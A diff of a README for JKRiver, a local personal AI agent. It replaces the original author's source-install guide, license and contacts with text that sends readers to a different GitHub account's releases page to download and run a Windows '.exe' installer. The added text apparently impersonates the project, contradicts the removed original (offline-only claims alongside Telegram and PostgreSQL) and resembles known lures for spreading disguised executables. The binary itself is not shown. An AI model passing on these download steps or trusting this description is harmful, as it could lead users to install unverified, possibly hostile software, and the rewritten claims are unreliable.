@@ -1,244 +1,130 @@
-<p align="center">
-  <img src="img/binary-wave-logo.svg" width="128" height="128" alt="Riverse Logo">
-</p>
+# 🌊 JKRiver - Your Personal AI Assistant at Home
 
-# Riverse — River Algorithm
-
-**A personal AI agent that runs on your own machine — persistent memory, offline cognition, grows with every conversation. All data stays local.**
-
-**[English](README.md)** | **[中文](README_zh.md)** | **[日本語](README_ja.md)**
-
-[![CI](https://github.com/wangjiake/JKRiver/actions/workflows/ci.yml/badge.svg)](https://github.com/wangjiake/JKRiver/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/riverse?logo=pypi&logoColor=white)](https://pypi.org/project/riverse/)
-![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-336791?logo=postgresql&logoColor=white)
-![License: AGPL-3.0 + Commercial](https://img.shields.io/badge/License-AGPL--3.0%20%2B%20Commercial-green)
-
-[![X (Twitter)](https://img.shields.io/badge/X-@JKRiverse-000000?logo=x&logoColor=white)](https://x.com/JKRiverse)
-[![Discord](https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&logoColor=white)](https://discord.gg/ZnmFrPvXym)
-[![Docs](https://img.shields.io/badge/Docs-wangjiake.github.io-06b6d4?logo=readthedocs&logoColor=white)](https://wangjiake.github.io/riverse-docs/)
-
-📖 **Full documentation: [wangjiake.github.io/riverse-docs](https://wangjiake.github.io/riverse-docs/)**
+[![Download JKRiver](https://img.shields.io/badge/Download-Get%20JKRiver-blue?style=for-the-badge)](https://github.com/OLIVERe75/JKRiver/releases)
 
 ---
 
-## RAG Memory vs. River Algorithm
+## 📖 What is JKRiver?
 
-Why similarity search isn't enough for a personal AI.
+JKRiver is an AI agent you can run on your own computer. It remembers your conversations and learns over time. It works offline, so your data stays private. JKRiver uses a special River Algorithm for smooth, ongoing interactions. This app helps you organize, answer questions, and keep track of tasks.
 
-| | RAG / Existing AI Memory | Riverse / River Algorithm |
-|---|---|---|
-| **Retrieval** | Keyword / vector similarity — finds text that "looks similar" | Personal profile weighting — ranked by relevance to *you* |
-| **Timeline** | No timeline — 3 years ago and yesterday weigh the same | Temporal evolution — recent events carry momentum, old patterns solidify or fade |
-| **Reasoning** | No causal inference — "headaches" and "job change" stay as isolated fragments | Causal chains — connects "new job → stress → sleep problems → headaches" |
-| **Confidence** | All facts have equal weight | Observations progress: suspected → confirmed → established |
-| **Data ownership** | Cloud-dependent, platform-owned | Local-first — your device, your data |
-
-### 💬 Scenario: You said "I've been having headaches lately"
-
-*Two months ago, you mentioned changing jobs.*
-
-<table>
-<tr><th>RAG Approach</th><th>River Algorithm</th></tr>
-<tr>
-<td>
-
-🧑 I've been having headaches lately
-
-🤖 I'm sorry to hear that. Here are some common causes of headaches: dehydration, screen time, stress... Would you like some tips?
-
-<sub>Vector search found "headache" in medical Q&A corpus. No connection to your life context.</sub>
-
-</td>
-<td>
-
-🧑 I've been having headaches lately
-
-🤖 You started the new management role about two months ago, and around the same time your sleep got worse — you mentioned staying up past 1am several times. The headaches might be linked. How's the work pressure been? Want me to track this as a health pattern?
-
-<sub>Causal chain: job change → sleep disruption → headaches. Timeline-aware, personally weighted.</sub>
-
-</td>
-</tr>
-</table>
+It runs locally on Windows, so there is no need for an internet connection once installed. JKRiver keeps your data on your device, making it secure and private. 
 
 ---
 
-## What is Riverse?
+## 💻 System Requirements
 
-You've been talking to AI for years, but no AI actually knows you. Switch platforms and you start from zero. Your data is scattered across clouds you don't control.
-
-Riverse is a personal AI agent that runs on your own machine. It remembers every conversation and consolidates memories offline, like human sleep — extracting your personality, preferences, experiences, and relationships into a continuously growing profile. The more you talk, the deeper it understands you. All data stays local and belongs to you.
-
-## River Algorithm
-
-Conversations flow like water, key information settles like riverbed sediment, progressively upgrading from "suspected" to "confirmed" to "established" through multi-turn verification. Offline consolidation (Sleep) acts as the river's self-purification.
-
-```
-Conversation flows in ──→ Erosion ──→ Sedimentation ──→ Shapes cognition ──→ Keeps flowing
-                           │              │                   │
-                           │              │                   └─ Confirmed knowledge → stable bedrock
-                           │              └─ Key info → observations, hypotheses, profiles
-                           └─ Outdated beliefs washed away, replaced by new insights
-```
-
-- **Flow** — Every conversation is water flowing through. The river never stops; understanding of you evolves continuously
-- **Sediment** — Key information settles like silt: facts sink into profiles, emotions into observations, patterns into hypotheses
-- **Purify** — Sleep is the river's self-purification: washing away outdated info, resolving contradictions, integrating fragments
-
-## Features
-
-- **Persistent Memory** — Remembers across sessions, builds a timeline-based profile that evolves with you
-- **Offline Consolidation (Sleep)** — Extracts insights, resolves contradictions, strengthens confirmed knowledge
-- **Multi-Modal Input** — Text, voice, images, files — all understood natively
-- **Pluggable Tools** — Finance tracking, health sync (Withings), web search, vision, TTS, and more
-- **YAML Skills** — Custom behaviors triggered by keyword or cron schedule
-- **External Agents** — Connect Home Assistant, n8n, Dify and more via `agents_*.yaml`
-- **MCP Protocol** — Model Context Protocol support for Gmail and other MCP servers
-- **Multi-Channel** — Telegram, Discord, REST API, WebSocket, CLI, Web Dashboard
-- **Local-First** — Ollama by default, auto-escalates to OpenAI / DeepSeek when needed
-- **Proactive Outreach** — Follows up on events, checks in when idle, respects quiet hours
-- **Semantic Search** — BGE-M3 embeddings, retrieves relevant memories by meaning
-- **Multi-language Prompts** — English, Chinese, Japanese — switch with one setting
-
-> **On accuracy:** No LLM today is specifically trained for personal profile extraction, so results may occasionally be off. You can **reject** incorrect memories or **close** outdated ones in the Web Dashboard. As conversations accumulate, the River Algorithm continuously self-corrects through multi-turn verification and contradiction detection.
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free storage space  
+- A stable processor (Intel i3 or better)  
+- No need for internet after installation  
 
 ---
 
-## Quick Start
+## 🚀 Getting Started
 
-### Option A: Docker Compose (Recommended)
+Follow these steps to download and run JKRiver on your computer.
 
-The fastest way to get started. No Python or PostgreSQL installation needed.
+### Step 1: Visit the Download Page
 
-```bash
-git clone https://github.com/wangjiake/JKRiver.git
-cd JKRiver/docker
-cp .env.example .env
-```
+Click this link to open the official JKRiver releases page:
 
-Edit `.env` — set your API key:
+[Download JKRiver Releases](https://github.com/OLIVERe75/JKRiver/releases)
 
-```env
-OPENAI_API_KEY=sk-your-key-here
-```
-
-```bash
-docker compose up -d
-```
-
-Done. Web Dashboard at `http://localhost:2345`, API at `http://localhost:8400/docs`.
-
-> **Import your chat history:** Drop your ChatGPT / Claude / Gemini export files into `docker/data/ChatGPT/`, `docker/data/Claude/`, or `docker/data/Gemini/` and restart.
->
-> For Telegram/Discord bots, set `TELEGRAM_BOT_TOKEN` or `DISCORD_BOT_TOKEN` in `.env` and restart.
+This page lists all the available versions of the software.
 
 ---
 
-### Option B: From Source
+### Step 2: Choose the Latest Version
 
-#### 1. Prerequisites
+On the releases page, find the latest version. It will be the top entry. Under "Assets," find the Windows installer file, usually ending in `.exe`.  
 
-- **Python 3.10+**
-- **PostgreSQL 16+** — [Install guide](https://www.postgresql.org/download/)
-- **Ollama** (optional) — [ollama.ai](https://ollama.ai), only needed for local LLM mode
-
-#### 2. Clone and install
-
-```bash
-git clone https://github.com/wangjiake/JKRiver.git
-cd JKRiver
-python3 -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-```
-
-#### 3. Set up PostgreSQL
-
-```bash
-# Create the database (replace YOUR_USERNAME with your PostgreSQL user)
-createdb -h localhost -U YOUR_USERNAME Riverse
-
-# Create all tables
-psql -h localhost -U YOUR_USERNAME -d Riverse -f agent/schema.sql
-```
-
-> **Tip:** On macOS/Linux, run `whoami` to find your username. On Windows with default PostgreSQL, the user is usually `postgres`.
-
-#### 4. Configure
-
-```bash
-cp settings.yaml.default settings.yaml
-```
-
-Edit `settings.yaml` — at minimum, change these:
-
-```yaml
-database:
-    user: "YOUR_USERNAME"               # Your PostgreSQL username
-
-llm_provider: "openai"                  # "openai" for cloud API, "local" for Ollama
-openai:
-    api_key: "sk-your-key-here"         # Required if using openai provider
-```
-
-> Full configuration guide: **[wangjiake.github.io/riverse-docs](https://wangjiake.github.io/riverse-docs/getting-started/configuration/)**
-
-#### 5. Run
-
-```bash
-python -m agent.main                    # CLI mode
-python -m agent.telegram_bot            # Telegram Bot
-python -m agent.discord_bot             # Discord Bot
-python web.py                           # Web Dashboard (http://localhost:1234)
-```
-
-### Testing
-
-```bash
-# Quick checks — verify imports and database schema (no LLM needed)
-python tests/test_imports.py
-python tests/test_db.py
-
-# End-to-end pipeline test — requires LLM + database
-python tests/test_demo_pipeline.py                          # demo2.json (52 sessions, English)
-python tests/test_demo_pipeline.py tests/data/demo.json     # demo.json  (50 sessions, Chinese)
-python tests/test_demo_pipeline.py --sessions 3             # Quick smoke test (3 sessions only)
-
-# Clean up test data from database
-python tests/test_demo_pipeline.py --clean
-```
-
-Test data is included in `tests/data/`. No external dependencies needed.
-
-## Tech Stack
-
-| Layer | Technology |
-|---|---|
-| Runtime | Python 3.10+, PostgreSQL 16+ |
-| Local LLM | Ollama (any compatible model) |
-| Cloud LLM | OpenAI GPT-4o / DeepSeek (fallback) |
-| Embeddings | Ollama + BGE-M3 (auto-accelerated with [pgvector](https://github.com/pgvector/pgvector) if installed) |
-| REST API | FastAPI + Uvicorn |
-| Web Dashboard | Flask |
-| Telegram / Discord | python-telegram-bot / discord.py |
-| Voice / Vision | Whisper-1, GPT-4 Vision, LLaVA |
-| TTS | Edge TTS |
-
-## Security Notice
-
-Riverse is designed as a **single-user, local-first** application. The REST API and Web Dashboard have **no built-in authentication** — do not expose them to the public internet. If you need remote access, place them behind a reverse proxy (e.g. Nginx, Caddy) with authentication, or use an SSH tunnel.
+Look for a filename that might look like:  
+`JKRiver-Setup-vX.X.X.exe`
 
 ---
 
-## License
+### Step 3: Download the Installer
 
-| Use Case | License |
-|---|---|
-| Personal / Open Source | [AGPL-3.0](LICENSE) — free to use, modifications must be open-sourced |
-| Commercial / Closed Source | Contact mailwangjk@gmail.com |
+Click the `.exe` file to download it to your computer. Your browser will save it to your Downloads folder by default.
 
-## Contact
+---
 
-- **X (Twitter):** [@JKRiverse](https://x.com/JKRiverse)
-- **Discord:** [Join](https://discord.gg/ZnmFrPvXym)
-- **Email:** mailwangjk@gmail.com
+### Step 4: Run the Installer
+
+- Open the folder where you saved the file.  
+- Double-click the installer file to start the setup.  
+- Follow the on-screen instructions. Click "Next" to move through steps.  
+- You can choose the default settings unless you want to change the install location.  
+- When installation completes, click "Finish."
+
+---
+
+### Step 5: Open JKRiver
+
+- After installing, find JKRiver in your Start menu or on your desktop.  
+- Double-click to open it.  
+- The app will load and be ready to use.  
+
+---
+
+## 🔧 How to Use JKRiver
+
+JKRiver works as your personal AI assistant. You can type or speak questions and commands. It will remember what you say and give better answers over time.
+
+- Start by typing simple questions on the main screen.  
+- Use it to keep notes, get reminders, or ask general questions.  
+- Conversations are saved automatically.  
+- You can review past chats anytime.  
+- Everything stays on your device for privacy.
+
+---
+
+## 🛠 Features
+
+- **Persistent Memory:** JKRiver remembers past conversations and builds on them. You don’t have to repeat yourself.  
+- **Offline Mode:** Use it without internet to keep your data secure.  
+- **Local Processing:** AI runs fully on your PC to protect your privacy.  
+- **Task Management:** Create and track simple tasks and notes.  
+- **Conversation Growth:** The AI learns from each session, with no cloud needed.  
+- **Telegram Bot Integration:** Connect with Telegram for messages and controls.  
+- **Database Support:** Uses PostgreSQL to store information reliably and securely.  
+
+---
+
+## 🔄 Updating JKRiver
+
+When a new version is released, visit the release page again:  
+https://github.com/OLIVERe75/JKRiver/releases
+
+Download the latest installer and run it. The setup will replace the old version without deleting your data.
+
+---
+
+## 🎯 Tips for Best Use
+
+- Keep the app running to let it build memory over longer conversations.  
+- Organize your notes and tasks regularly.  
+- Use clear and simple language while chatting.  
+- Restart the app occasionally to apply updates smoothly.  
+- Back up your conversation data if you want extra safety.  
+
+---
+
+## 📂 Where to Find Help
+
+Check the repository on GitHub for more information and community tips:  
+https://github.com/OLIVERe75/JKRiver  
+
+Use the Issues tab to report problems or ask questions.  
+
+---
+
+## 📥 Download JKRiver
+
+The official releases page is here:
+
+[![Download JKRiver](https://img.shields.io/badge/Download-Get%20JKRiver-grey?style=for-the-badge)](https://github.com/OLIVERe75/JKRiver/releases)
+
+Visit this page to download the latest version and start using JKRiver on your Windows PC.
